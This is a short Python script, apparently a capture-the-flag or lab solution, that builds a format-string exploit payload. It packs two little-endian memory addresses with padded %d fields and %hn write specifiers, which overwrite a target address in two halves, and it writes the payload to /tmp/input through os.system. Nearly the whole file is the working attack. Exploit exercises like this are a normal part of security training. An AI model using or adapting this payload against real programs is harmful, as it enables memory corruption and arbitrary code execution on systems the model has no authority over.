#!/usr/bin/python

import os

writeAddr = "\x08\x04\x98\x38"[::-1]
writeAddr2 = "\x08\x04\x98\x3a"[::-1]
payload = writeAddr2 + writeAddr + "%2044d" + "%4\$hn" + "%31904d" + "%5\$hn"
cmd = "echo \"" + payload + "\" > /tmp/input"
os.system(cmd)
